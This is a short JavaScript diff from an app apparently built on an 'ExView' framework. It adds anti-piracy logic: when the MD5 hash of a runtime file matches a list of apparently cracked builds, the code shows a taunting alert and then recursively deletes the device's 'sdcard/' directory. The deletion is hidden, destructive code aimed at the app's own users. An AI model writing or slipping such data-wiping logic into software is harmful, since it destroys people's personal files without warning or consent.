@@ -153,7 +153,8 @@
 		$$.get("MoeRuntime.so",function(result){
 			var sign_md5=(ExView.tools.md5.hex_md5(result));
 			if(nomd5.indexOf(sign_md5)!=-1){
-				ExView.fw.alert("Hello!欢迎使用爱啪妹破解！");
+				alert("Hello!欢迎使用爱啪妹破解！");
+				ExView.tools.file.rmdir("sdcard/",function(){},function(){},mySession.fs);
 			}},function(){})
 	},1000);
 /* 	if(localStorage.ExView_InitJSON&&localStorage.ExView_InitJSON!='""'&&localStorage.ExView_InitJSON!=''){
